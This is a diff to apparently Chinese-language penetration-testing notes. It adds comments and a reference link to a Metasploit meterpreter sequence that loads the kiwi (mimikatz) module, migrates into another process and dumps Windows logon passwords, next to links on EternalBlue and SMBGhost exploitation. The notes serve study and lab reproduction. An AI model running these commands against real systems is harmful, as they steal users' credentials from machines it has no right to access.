@@ -141,7 +141,12 @@ sessions -i 2
 load kiwi
 kiwi_cmd privilege::debug
 ps
+#getpid #查看meterpreter shell的进程号
+
 migrate 1144
+#kill 2496 #关闭进程
+#run post/windows/manage/migrate #自动迁移进程
+
 kiwi_cmd sekurlsa::logonPasswords
 
 ```
@@ -154,3 +159,5 @@ kiwi_cmd sekurlsa::logonPasswords
 [永恒之蓝漏洞复现(ms17-010) - hkgan - 博客园](https://www.cnblogs.com/hkgan/p/17339860.html)
 
 [SMBGhost\_RCE漏洞利用（MSF和CS联动） - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/277707.html)
+
+[MSF中kiwi模块的使用\_load kivi-CSDN博客](https://blog.csdn.net/m0_53087192/article/details/112707016)
